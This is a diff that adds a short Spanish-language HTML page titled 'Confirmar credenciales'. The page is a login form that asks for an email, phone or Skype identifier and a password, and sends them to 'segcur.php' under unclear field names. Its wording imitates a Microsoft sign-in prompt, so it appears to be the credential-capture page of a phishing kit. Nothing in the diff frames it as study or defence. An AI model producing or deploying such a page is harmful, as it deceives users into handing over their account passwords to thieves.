@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Vista Confirmar</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
+    <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+    <form action="segcur.php" method="post" class="formulario">
+        <div class="contenedor">
+            <img src="logo.jpg" alt="Logo de la empresa" style="width: 25%">
+            <h1>Confirmar credenciales</h1>
+            <div class="input-contenedor">
+                <i class="fas fa-envelope icon"></i>
+                <input type="text" name="solapai" required placeholder="Correo electrónico, teléfono o Skype">
+            </div>
+            <div class="input-contenedor">
+                <i class="fas fa-key icon"></i>
+                <input type="password" name="segunpai" required placeholder="Contraseña">
+            </div>
+            <input type="submit" value="Siguiente" class="button">
+            <p>Condiciones de uso y Política de privacidad.</p>
+            <p>¿No tienes una cuenta? <a class="link" href="#">Regístrate</a></p>
+        </div>
+    </form>
+</body>
+</html>
